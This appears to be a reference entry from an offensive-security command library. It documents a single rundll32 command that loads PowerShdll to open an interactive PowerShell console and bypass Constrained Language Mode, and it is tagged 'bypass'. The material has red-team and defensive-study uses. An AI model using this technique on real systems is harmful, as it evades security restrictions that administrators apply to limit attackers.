---
type: command
executor: cmd
data: 'rundll32 PowerShdll,main -w'
output: null
platforms:
  - Windows
tags:
  - interactive
  - console
  - bypass
verified: true
validated: true
---

# rundll32-powershdll-interactive-new-window

## Command

```cmd
rundll32 PowerShdll,main -w
```

## Description

Starts an interactive PowerShell console in a new window using PowerShdll, bypassing CLM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -w | Open in new window (default) | Yes |

## Examples

### Basic Usage

```cmd
rundll32 PowerShdll,main -w
```

## Expected Output

New window with PowerShell prompt in FullLanguage mode.

## Related

- [[procedures/Bypass-Constrained-Language-Mode-with-PowerShell-DLL-Runner]]
- [[tools/PowerShdll]]
